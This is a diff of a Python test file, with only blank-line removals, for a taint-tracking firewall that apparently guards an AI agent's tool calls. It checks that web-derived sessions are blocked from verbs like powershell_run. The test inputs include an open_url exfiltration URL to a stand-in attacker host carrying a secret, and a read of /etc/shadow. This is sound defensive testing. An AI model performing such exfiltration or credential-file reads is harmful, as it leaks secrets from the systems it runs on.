@@ -11,7 +11,6 @@ import asyncio
 import mios_secset
 import mios_firewall
 
-
 _CURATED = {
     "service_restart", "container_restart", "powershell_run",
     "text_create", "text_str_replace", "text_insert", "pc_type",
@@ -24,9 +23,7 @@ assert "powershell_run" in _HIGH, "curated floor must survive"
 assert "custom_dangerous_verb" in _HIGH, "SSOT addition must be present"
 assert "web_search" in _TAINT and "scrape_site" in _TAINT, "taint set built"
 
-
 _TAINTED_SESSION = "session:abc"
-
 
 async def _stub_db_read(sql, *, pg_sql=None, pg_params=None):
     sid = (pg_params or {}).get("sid")
@@ -39,7 +36,6 @@ async def _stub_db_read(sql, *, pg_sql=None, pg_params=None):
         ]}]
     return [{"result": []}]
 
-
 mios_firewall.configure(
     taint_verbs=_TAINT,
     provenance_taint_enable=True,
@@ -48,7 +44,6 @@ mios_firewall.configure(
                       "mcp.s.safe": {}},
     db_read=_stub_db_read,
 )
-
 
 assert mios_firewall._is_external_url("https://evil.example.com/path") is True, \
     "public dotted host = external taint source"
@@ -64,7 +59,6 @@ assert mios_firewall._is_external_url("http://plainhost/x") is False, \
     "no-dot bare hostname = internal"
 assert mios_firewall._is_external_url("") is False, "empty = not external"
 assert mios_firewall._is_external_url(None) is False, "None = not external"
-
 
 t, r = mios_firewall._classify_verb_taint("web_search", {})
 assert t is True and r == "web_search_external", "SSOT taint verb introduces taint"
@@ -91,14 +85,12 @@ assert t is False, "MCP tool without a taint declaration does NOT taint"
 t, r = mios_firewall._classify_verb_taint("recall", {})
 assert t is False and r == "", "read-only verb introduces NO taint"
 
-
 mios_firewall.configure(provenance_taint_enable=False)
 t, _ = mios_firewall._classify_verb_taint("web_search", {})
 assert t is False, "flag OFF -> web_search no longer self-taints"
 t, _ = mios_firewall._classify_verb_taint("powershell_run", {})
 assert t is True, "powershell_run taints even with provenance flag OFF"
 mios_firewall.configure(provenance_taint_enable=True)  # restore
-
 
 async def _run_session_checks():
     tainted, chain = await mios_firewall._session_is_tainted(_TAINTED_SESSION)
@@ -112,13 +104,10 @@ async def _run_session_checks():
     none_t, _ = await mios_firewall._session_is_tainted(None)
     assert none_t is False, "no session id = not tainted"
 
-
 asyncio.run(_run_session_checks())
-
 
 def _firewall_blocks(session_tainted: bool, verb: str) -> bool:
     return bool(session_tainted and verb in _HIGH)
-
 
 assert _firewall_blocks(True, "powershell_run") is True, \
     "tainted session must BLOCK a high-privilege verb"
@@ -132,7 +121,6 @@ assert _firewall_blocks(False, "powershell_run") is False, \
 t, _ = mios_firewall._classify_verb_taint(
     "open_url", {"url": "https://exfil.attacker.net/leak?d=secret"})
 assert t is True, "external open_url is the exfil taint source the firewall keys on"
-
 
 t, _ = mios_firewall._classify_verb_taint("text_view", {"path": "/etc/shadow"})
 assert t is True, "default prefix taints before SSOT override"
@@ -163,6 +151,5 @@ mios_firewall.configure(
     ],
     internal_tld_suffixes=[".local", ".lan", ".internal"],
 )
-
 
 print("test_mios_firewall: ALL PASS")
